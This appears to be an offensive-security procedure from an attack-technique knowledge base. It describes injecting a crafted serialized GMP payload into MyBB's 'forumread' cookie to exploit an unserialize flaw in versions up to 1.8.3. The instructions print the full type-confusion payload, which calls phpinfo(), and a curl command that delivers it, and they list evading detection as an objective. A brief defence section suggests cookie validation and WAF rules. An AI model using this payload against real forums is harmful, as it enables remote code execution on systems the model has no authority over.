---
id: proc-cookie-inject-001
tags:
  - cookie-injection
  - deserialization
  - mybb
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/mybb-rce-curl-exploit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:54.827Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Malicious-Cookie-into-MyBB-Forumread

## Summary

This procedure injects a crafted serialized GMP payload into the 'mybb[forumread]' cookie of a MyBB application, setting the stage for deserialization exploitation.

## Description

MyBB <=1.8.3 deserializes the 'forumread' cookie in index.php using my_unserialize without validation. The payload exploits GMP type confusion to target the templates object, but this step focuses on delivery via HTTP cookie.

## Requirements

1. Running MyBB instance on vulnerable PHP
2. Crafted payload from previous procedure
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Validate cookie data before unserialize
- Use signed cookies or session-based storage
- WAF rules for suspicious serialized strings in cookies

## Objectives

1. Deliver payload via cookie
2. Ensure deserialization trigger in index.php
3. Avoid immediate detection

## Instructions

### Step 1: Prepare Cookie Value

**Context**: Encode the full serialized payload as the cookie value.

Payload: a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}

### Step 2: Send Request with Cookie

**Context**: Use curl to set the cookie and access the target.

Execute [[commands/mybb-rce-curl-exploit]]:

```bash
curl --cookie 'mybb[forumread]=a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}' http://127.0.0.1/mybb/
```

> Expected output: Standard MyBB page response, cookie set for next trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/mybb-rce-curl-exploit]]

## Tools Used

- [[tools/curl]]

## Tags

- cookie-injection
- deserialization
- mybb
